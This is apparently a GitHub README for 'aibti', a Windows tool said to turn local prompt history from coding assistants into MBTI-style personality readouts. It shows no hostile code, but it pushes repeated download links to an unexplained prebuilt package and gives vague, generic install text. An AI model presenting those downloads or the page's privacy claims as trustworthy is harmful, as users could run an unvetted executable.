# aibti v3.1-beta.5 - Personality Analysis Tool 2026

> **Aibti is a Windows-based, local-first personality analysis tool for prompt history. It scans local files, compares your AI interaction habits against MBTI-style profiles, and keeps all processing on your machine in version 3.1-beta.5.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v3.1--beta.5-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lucassfstone6461/aibti-local-windows-analyzer?style=flat-square)](https://github.com/lucassfstone6461/aibti-local-windows-analyzer)

---

<p align="center">
  <a href="https://lucassfstone6461.github.io/aibti-local-windows-analyzer/">
    <img src="https://img.shields.io/badge/Download-aibti%20Latest-brightgreen?style=for-the-badge" alt="Download aibti">
  </a>
</p>

> **[Direct Download - aibti v3.1-beta.5](https://lucassfstone6461.github.io/aibti-local-windows-analyzer/)**

---

[Download Latest Build](https://lucassfstone6461.github.io/aibti-local-windows-analyzer/)

---

## What aibti does

Aibti is made for users who want to study how they communicate with AI systems without uploading their data anywhere. It takes prompt history from local storage and transforms that activity into a personality-centered readout of your interaction style, which can be helpful for prompt engineers, independent developers, and anyone tracking their own LLM conversation patterns.

The project is built for local-first and self-hosted workflows, so it suits environments where privacy and user control are important. It can process logs from coding assistants including Claude Code, Cursor, and Codex, then surface results that help you identify routines, preferences, and repeated behaviors.

---

## Key capabilities

- Reads prompt history from local files
- Associates AI interaction style with 16 personality types
- Operates fully on-device without sending information to external servers
- Works with logs from coding assistants and LLM-based workflows
- Geared toward prompt engineering and behavior analysis
- Supports exporting results for sharing or long-term storage
- Can generate printed reports for offline review
- Designed as a self-hosted, local-first Windows utility

---

## Installation

You can either clone the repository or grab the latest build, then keep it in a folder that is reachable on your local machine.

    git clone https://github.com/lucassfstone6461/aibti-local-windows-analyzer.git

Once it is in place, launch the app or use the local CLI entry point from the project directory, depending on how your build is packaged. For a released version, start from the downloaded folder and follow the bundled launch files or setup notes.

---

## How to use it

1. Direct Aibti to the local files that hold your prompt or assistant history.
2. Start the analysis to look for repeated interaction patterns.
3. Inspect the personality mapping and the summary of your AI usage style.
4. Export or print the output if you want an archive or a way to compare future runs.

Example workflow:

    aibti analyze --input path/to/history
    aibti export --format html
    aibti print

If you are analyzing coding assistant logs, confirm the source files are already present on your machine before you begin.

---

## Configuration

Aibti is meant to stay local, so its settings are usually stored with the application or in a project-level config file. If your build includes one, use it to define input paths, source locations, and export preferences.

Example structure:

    {
      "inputPath": "./logs",
      "outputFormat": "html",
      "personalityModel": "mbti"
    }

If your release does not ship with a config file, rely on the command-line switches or launch options provided with the build.

---

## Requirements

- Windows
- Local access to prompt history or assistant log files
- A compatible runtime or packaged build, depending on the release format
- Sufficient disk space for logs, exports, and generated reports
- A local environment suitable for CLI-style or desktop execution

---

## FAQ

**Does Aibti send my data to external services?**  
No. It is intended to work locally with files stored on your machine.

**Can it analyze coding assistant history?**  
Yes. It supports logs from tools such as Claude Code, Cursor, and Codex.

**How do I update it?**  
Download the newest build from the project release location and replace the older copy if needed.

**Where are my settings stored?**  
Depending on the build, settings are usually kept in the app folder or in a local config file.

**What if the analysis does not find my files?**  
Verify the input path, make sure the files exist locally, and confirm that the selected format matches your data.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
